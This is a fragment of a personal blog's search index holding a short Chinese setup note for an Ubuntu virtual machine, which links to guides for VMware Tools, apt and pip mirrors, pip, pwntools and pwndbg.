-<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
-<p>如果提示 的是 路径， 则直接回车就好。</p>
-<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
-<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
-<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
-https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
-https://www.cnblogs.com/flyinggod/p/7979108.html
-不推荐：https://blog.csdn.net/xkwy100/article/details/80301156
-
-解决问题E: Could not get lock /var/lib/apt/lists/lock
-https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
-<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
-<pre><code>安装：  sudo apt install python-pip
-
-遇到问题，    
-        Unable to locate package python-pip
-解决方法： 更新软件源
-        sudo apt-get update
-
-网址    https://www.jianshu.com/p/568aab038d4c
-    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
-<pre><code>sudo mkdir ~/.pip/
-cd ./.pip/
-touch pip.conf
-sudo gedit pip.conf 
-
-网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
-        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
-<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
-]]></content>
-      <tags>
-        <tag>虚拟机配置</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>链接</title>
-    <url>/2019/11/05/%E9%93%BE%E6%8E%A5/</url>
-    <content><![CDATA[]]></content>
   </entry>
 </search>
